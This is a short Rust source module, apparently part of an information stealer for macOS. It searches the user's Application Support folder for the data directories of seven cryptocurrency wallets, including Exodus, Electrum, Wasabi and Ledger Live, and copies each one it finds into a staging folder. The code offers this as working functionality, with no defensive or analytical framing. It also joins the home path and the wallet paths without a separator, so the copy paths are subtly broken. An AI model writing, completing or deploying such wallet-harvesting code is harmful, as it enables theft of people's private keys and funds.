use crate::tools;
use anyhow::Result;

pub struct Wallets;

impl Wallets {
    pub fn new() -> Self {
        Wallets
    }

    pub fn collect_wallet_data(&self, temp_path: &str) -> Result<()> {
        let wallet_paths = vec![
            "Exodus/exodus.wallet/",
            "electrum/wallets/",
            "Coinomi/wallets/",
            "Guarda/Local Storage/leveldb/",
            "walletwasabi/client/Wallets/",
            "atomic/Local Storage/leveldb/",
            "Ledger Live/",
        ];

        let wallets_path_dest = format!("{}/Wallets", temp_path);
        let home_dir = format!("{}/Library/Application Support", tools::get_home_directory());

        for wallet_path in wallet_paths {
            let source_dir = format!("{}{}", home_dir, wallet_path);
            let wallet_name = wallet_path.split("/").next().unwrap_or("");
            let dest_dir = format!("{}/{}", wallets_path_dest, wallet_name);

            if tools::file_exists(&source_dir) {
                tools::copy_directory_with_files(&source_dir, &dest_dir)?;
                println!("Copied {} to {}", source_dir, dest_dir);
            } else {
                println!("Source directory {} is empty or does not exist, skipping.", source_dir);
            }
        }
        Ok(())
    }
} 